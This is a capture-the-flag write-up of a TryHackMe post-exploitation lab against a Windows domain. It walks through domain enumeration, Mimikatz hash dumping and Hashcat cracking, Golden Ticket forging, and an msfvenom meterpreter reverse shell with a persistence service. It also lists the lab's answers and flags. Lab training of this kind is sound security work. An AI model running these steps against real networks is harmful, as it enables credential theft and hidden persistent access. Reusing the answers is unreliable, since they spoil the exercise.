# Day 18 - Post-Exploitation Basics — TryHackMe Writeup

A walkthrough of the Post-Exploitation Basics room on TryHackMe, covering enumeration with PowerView and BloodHound, hash dumping with Mimikatz, Golden Ticket attacks, and maintaining persistence.

---

## Task 2: Enumeration with PowerView

**Answers:**
- Shared folder not set by default: `Share`
- Other OS on the network: `Windows 10 Enterprise Evaluation`
- Hidden flag: `POST{P0W3RV13W_FTW}`

PowerView is a powerful PowerShell script from PowerShell Empire that I used to enumerate the domain after gaining a shell on the system.

### Steps

**1. Connect via RDP using Remmina, then open CMD as Administrator.**

**2. Bypass the PowerShell execution policy:**
```powershell
powershell -ep bypass
```

**3. Navigate to Downloads and load PowerView:**
```powershell
cd Downloads
. .\Downloads\PowerView.ps1
```

**4. Enumerate domain users:**
```powershell
Get-NetUser | select cn
```

**5. Enumerate admin groups:**
```powershell
Get-NetGroup -GroupName *admin*
```

**6. Find shared folders (the `Share` folder is non-default):**
```powershell
Invoke-ShareFinder
```

**7. View operating systems on the network:**
```powershell
Get-NetComputer -fulldata | select operatingsystem*
```

---

## Task 3: Enumeration with BloodHound

**Answers:**
- Service that is also a domain admin: `sqlservice`
- Two Kerberoastable users: `SQLSERVICE, KRBTGT`

BloodHound is a graphical tool that lets me visually map out the network. It works alongside SharpHound, which collects user, group, and trust data and saves it as `.json` files inside a zip.

### Steps

**1. Connect via RDP and open CMD as Administrator.**

**2. Bypass execution policy and load SharpHound:**
```powershell
powershell -ep bypass
. .\Downloads\SharpHound.ps1
```

**3. Collect all domain data and save to a zip:**
```powershell
Invoke-BloodHound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```

**4. Transfer the zip to my attacking machine via SCP:**
```bash
ssh administrator@<Target_IP>
# Then on my machine:
scp Administrator@<Machine_IP>:Downloads/<ZIP_FILE> /tmp/<ZIP_FILE>
```

**5. Start Neo4j and BloodHound:**
```bash
neo4j console
# In another terminal:
bloodhound
```

**6. Log into BloodHound, import the zip, and analyze the graph.**

> I ran into a technical issue importing the zip, so I manually extracted it and inspected `users.json` to find the answers.

By analyzing the JSON, I identified that `SQLSERVICE` has a Service Principal Name (SPN) pointing to the domain controller — making it a domain admin. Both `SQLSERVICE` and `KRBTGT` have non-empty SPNs, which makes them Kerberoastable.

---

## Task 4: Dumping Hashes with Mimikatz

**Answers:**
- Machine1 Password: `Password1`
- Machine2 Hash: `c39f2beb3d2ec06a62cb887fb391dee0`

### Steps

**1. SSH into the target:**
```bash
ssh Administrator@<IP_Address>
```

**2. Run Mimikatz:**
```cmd
cd Downloads && dir
mimikatz.exe
```

**3. Verify administrator privilege:**
```
privilege::debug
```
The output showed `OK`, confirming admin access.

**4. Dump all NTLM hashes:**
```
lsadump::lsa /patch
```

**5. Crack the hashes using Hashcat on my machine:**
```bash
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

- Machine1 hash cracked to: `Password1`
- Machine2 hash cracked to: `Password2`

---

## Task 5: Golden Ticket Attacks with Mimikatz

To create a Golden Ticket, I needed the domain name, a username, and the NTLM hash of the `krbtgt` account.

### Steps

**1. Dump the krbtgt account details:**
```
lsadump::lsa /inject /name:krbtgt
```

**2. Create the Golden Ticket:**
```
kerberos::golden /user:Administrator /domain:controller.local /sid:<SID> /krbtgt:<NTLM_HASH> /id:<Admin_ID>
```

**3. Open a new privileged command prompt using the ticket:**
```
misc::cmd
```

---

## Task 6: Enumeration with Server Manager

**Answers:**
- Tool to view event logs: `Event Viewer`
- SQL Service password: `MYpassword123#`

Since servers are rarely logged into outside of maintenance, the built-in Windows Server Manager gives a lot of useful enumeration surface when I already have domain admin. I can view and modify trusts, users, and groups — and potentially find credentials or pivot to other machines.

### Steps

**1. Connect via RDP and open Active Directory Users and Computers.**

**2. Navigate to the Users folder and locate the SQLSERVICE account.**

**3. Extract the NTLM hash using Mimikatz (`lsadump::lsa /patch`), then copy it to a file.**

**4. Crack it with Hashcat:**
```bash
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Password: `MYpassword123#`

---

## Task 7: Maintaining Access with msfvenom

To maintain access, I created a reverse shell payload and set it up to run persistently on the target.

### Steps

**1. Generate the payload:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<MY_TUN0_IP> LPORT=4444 -f exe -o shell.exe
```

**2. Upload it to the target:**
```bash
scp shell.exe Administrator@<Target_IP>:shell.exe
```

**3. Set up the Metasploit listener:**
```bash
msfconsole
search type:exploit name:handler
use 1
set LHOST <MY_TUN0_IP>
set LPORT 4444
set payload windows/meterpreter/reverse_tcp
exploit
```

**4. Execute the shell on the victim machine, then confirm access:**
```
getuid
```

Since I was already running as Administrator, no privilege escalation was needed.

**5. Background the session and set up persistence:**
```
background
use exploit/windows/local/persistence_service
set LHOST <MY_TUN0_IP>
set LPORT 5555
set session 1
run
```

This ensures I get a new Meterpreter shell automatically whenever the victim connects to the internet — without needing them to run anything again.

---